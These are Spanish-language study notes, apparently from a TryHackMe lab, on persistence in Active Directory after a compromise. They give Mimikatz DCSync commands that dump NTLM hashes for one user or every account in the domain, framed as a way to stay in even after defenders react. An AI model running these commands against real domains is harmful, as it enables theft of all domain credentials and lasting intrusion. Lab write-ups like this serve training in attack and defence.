# Persistencia en Active Directory

Durante un ataque a AD, necesitaremos estar seguros de tener persistencia. En caso de que el blue team nos eche o cambie las credenciales.

Conexión a una red de Dominio desde Ubuntu

```
systemd-resolve --interface persistad --set-dns $THMDCIP --set-domain za.tryhackme.loc
```

# Persistencia con credenciales

## DC Sync

Como entendemos tener un simple DC por dominio es ilogico. Estos dominios usan multiples localizaciones, con o cual eso significa que necesitan autentificarse a AD desde diferentes servicios.

Osea que la replicación de dominio. o el controlador KCC. Genera una topología replicada como si fuera un bosque de AD y automaticamente se conecta a los controladores por RPC. 

Un ataque popular es el DC Sync attac. Teniendo acceso a una cuenta podemos replicar los permisos, con los controladres de dominio

## No todas las credenciales se pueden crear igual

Antes de empezar con dicho ataque, tenemos que ver su potencial. Mientras siempre sepas las credenciales de un privilegio esta guay, pero si no tenemos dichas credenciales o privilegios. deberemos saber esto:

- Credenciales de administrador
- Servicios de cuentas con permisos delegaods
- Cuentas de usuarios con privilegios en servicios de AD

## DCSync ALL

Utilizaremos Mimikatz para encontrar credenciales y conectarnos via ssh

![image](https://github.com/user-attachments/assets/0b59539a-f621-470f-b8eb-3bc1e284dd8f)

```
lsadump::dcsync /domain:za.tryhackme.loc /user:<Your low-privilege AD Username>
```

Con esto sacamos los hashes NTLM de usuarios en cuestión del AD

```
log <username>_dcdump.txt
```
```
lsadump::dcsync /domain:za.tryhackme.loc /all
```


